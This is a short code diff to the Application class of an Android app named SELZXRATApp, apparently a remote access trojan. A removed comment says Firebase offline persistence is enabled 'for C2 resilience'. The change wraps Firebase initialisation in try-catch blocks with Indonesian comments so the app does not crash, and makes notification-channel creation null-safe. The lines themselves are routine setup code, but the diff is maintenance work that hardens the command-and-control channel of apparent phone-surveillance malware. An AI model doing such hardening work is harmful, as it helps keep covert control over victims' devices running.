@@ -4,6 +4,7 @@ import android.app.Application
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.os.Build
+import android.util.Log
 import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.storage.FirebaseStorage
 
@@ -20,14 +21,26 @@ class SELZXRATApp : Application() {
         super.onCreate()
         instance = this
 
-        // Enable Firebase offline persistence for C2 resilience
-        FirebaseDatabase.getInstance().setPersistenceEnabled(true)
+        try {
+            // Kita pakai FirebaseDatabase.getInstance() dulu
+            val db = FirebaseDatabase.getInstance()
+            
+            // Kita bungkus setPersistence dalam try-catch supaya kalau gagal, tidak crash
+            try {
+                db.setPersistenceEnabled(true)
+            } catch (e: Exception) {
+                Log.e("SELZXRATApp", "Persistence error (abaikan jika ini restart): ${e.message}")
+            }
+
+            // Inisialisasi Storage
+            FirebaseStorage.getInstance()
+            
+        } catch (e: Exception) {
+            Log.e("SELZXRATApp", "Fatal Firebase Init: ${e.message}")
+        }
 
         // Create notification channel
         createNotificationChannel()
-
-        // Initialize Firebase
-        FirebaseStorage.getInstance()
     }
 
     private fun createNotificationChannel() {
@@ -42,7 +55,7 @@ class SELZXRATApp : Application() {
                 setShowBadge(true)
             }
             val manager = getSystemService(NotificationManager::class.java)
-            manager.createNotificationChannel(channel)
+            manager?.createNotificationChannel(channel)
         }
     }
 }
